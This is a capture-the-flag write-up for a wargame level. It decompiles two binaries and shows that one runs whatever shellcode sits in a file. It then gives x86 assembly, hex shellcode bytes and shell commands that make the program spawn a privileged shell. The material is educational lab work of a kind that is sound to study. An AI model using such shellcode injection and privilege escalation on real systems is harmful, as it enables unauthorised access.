We have in this challenge two executables, `behemoth6` and `behemoht6_reader`. 
As seen in the decompiled main() of `behemoth6`, it opens `behemoth6_reader` as a pipe:
```c
__stream = popen("/behemoth/behemoth6_reader","r");
```
Checks if the pipe was created succesfully:
```c
if (__stream == (FILE *)0x0) {
  puts("Failed to create pipe.");
  exit(0);
}
```
Gets a string from the pipe to allocated space on the heap and closes the pipe:
```c
__s1 = (char *)malloc(10);
fread(__s1,10,1,__stream);
pclose(__stream);
```
Then compares it to `HelloKitty`:
```c
iVar1 = strcmp(__s1,"HelloKitty");
```
If it does equal we get a shell, otherwise an error:
```c
if (iVar1 == 0) {
  puts("Correct.");
  __euid = geteuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  execl("/bin/sh","sh",0);
}
else {
  puts("Incorrect output.");
}
```


So, to get a shell we need to make `behemoht6_reader` print `HelloKitty` to stdout.
Let's see `behemoht6_reader`'s code.
In the decompiled main function, it first tries to open a file named `shellcode.txt`.
```c
__stream = fopen("shellcode.txt","r");
if (__stream == (FILE *)0x0) {
  puts("Couldn\'t open shellcode.txt!");
}
```
If it did open it succesfully, it executes its contens, so it's obviously a shellcode (also from the obvious name):
```c
else {
  fseek(__stream,0,2);
  __size = ftell(__stream);
  rewind(__stream);
  __ptr = (code *)malloc(__size);
  fread(__ptr,__size,1,__stream);
  fclose(__stream);
  for (local_14 = 0; local_14 < (int)__size; local_14 = local_14 + 1) {
      if (__ptr[local_14] == (code)0xb) {
      puts("Write your own shellcode.");
      exit(1);
      }
  }
  (*__ptr)();
}
```
So, to get a shell we need to make `behemoht6_reader` print `HelloKitty` to stdout right? And we can run a shellcode on `behemoht6_reader`, so lets just write a simple shellcode that prints `HelloKitty` to stdout, which will be picked by `behemoth6`.
The assembly code for the shellcode is:
```asm
; 32 bit calling convention: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit
sub esp, 32 ; Allocate space on the stack
push 0 ; push the NULL byte of the "HelloKitty" string
; push "HelloKitty" in reversed and little endian order
push 0x7974 
push 0x74694B6F
push 0x6C6C6548
mov eax, 4 ; syscall number for write(3)
mov ebx, 1 ; stdout file descriptor
mov ecx, esp ; the stack houses the "HelloKitty" string
mov edx, 10 ; "HelloKitty" is 10 bytes long
; zero out the rest of the relevent registers to make sure they don't interfere
xor esi, esi 
xor edi, edi
xor ebp, ebp
int 0x80 ; syscall 
```
Now, to make `shellcode.txt` with our shellcode we need to compile it to a string we can have in the `shellcode.txt` file, we can do that with this site: https://defuse.ca/online-x86-assembler.htm.
To make `behemoth6_reader` run our shellcode we need to simply run a few shell commands:
```sh
mkdir /tmp/6 # create a new directory in which we can write out shellcode.txt file
cd /tmp/6
printf "\x83\xEC\x20\x6A\x00\x68\x74\x79\x00\x00\x68\x6F\x4B\x69\x74\x68\x48\x65\x6C\x6C\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x0A\x00\x00\x00\x31\xF6\x31\xFF\x31\xED\xCD\x80" > shellcode.txt # print the compiled shellcode into shellcode.txt
/behemoth/behemoth6 # run behemoth6 and get a shell!
```
